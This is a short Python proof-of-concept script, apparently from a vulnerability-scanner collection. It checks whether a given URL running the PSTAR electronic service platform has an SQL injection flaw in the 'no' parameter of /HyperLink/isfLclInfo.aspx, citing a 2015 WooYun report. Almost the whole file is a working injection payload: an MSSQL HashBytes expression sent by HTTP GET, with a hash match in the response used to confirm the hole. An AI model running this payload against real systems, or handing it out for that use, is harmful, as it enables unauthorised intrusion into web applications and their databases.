#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: PSTAR-电子服务平台SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0128182
author: Lucifer
description: 文件/HyperLink/isfLclInfo.aspx?type=A&no=,no参数存在SQL注入漏洞。
'''
import sys
import requests
import warnings
def run(url):
        result = ['PSTAR-电子服务平台SQL注入漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/HyperLink/isfLclInfo.aspx?type=A&no=%27AnD/**/1=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
